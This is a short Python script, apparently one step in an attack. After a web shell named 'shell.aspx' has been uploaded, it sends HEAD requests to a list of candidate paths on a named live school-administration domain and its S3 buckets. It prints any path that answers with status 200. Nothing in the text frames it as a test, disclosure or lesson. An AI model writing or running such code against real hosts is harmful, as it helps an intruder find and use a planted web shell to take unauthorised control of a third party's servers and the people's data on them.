# After upload, check common paths for the uploaded file
import requests

common_paths = [
    # Direct server paths
    "https://econnectapp.jupsoft.com/StudentAdministration/Uploads/shell.aspx",
    "https://econnectapp.jupsoft.com/StudentAdministration/Uploads/Visitor/shell.aspx",
    "https://econnectapp.jupsoft.com/StudentAdministration/VisitorDocs/shell.aspx",
    "https://econnectapp.jupsoft.com/Uploads/shell.aspx",
    "https://econnectapp.jupsoft.com/Content/Uploads/shell.aspx",
    "https://econnectapp.jupsoft.com/assets/Uploads/shell.aspx",
    
    # S3 paths
    "https://jtpleconnect.s3.ap-south-1.amazonaws.com/Worksheet/HILWOD/shell.aspx",
    "https://jtpleconnect.s3.ap-south-1.amazonaws.com/Worksheet/HILWOD/Uploads/shell.aspx",
    "https://jtpleconnect.s3.ap-south-1.amazonaws.com/Worksheet/MAXFRT/shell.aspx",
    "https://jtpleconnect.s3.ap-south-1.amazonaws.com/Worksheet/MAXFRT/Visitor/shell.aspx",
    
    # Temp ASP.NET paths
    "https://econnectapp.jupsoft.com/Temporary ASP.NET Files/shell.aspx",
]

for path in common_paths:
    try:
        r = requests.head(path, timeout=5)
        if r.status_code == 200:
            print(f"[!] FOUND: {path} -> Status: {r.status_code}")
    except:
        pass
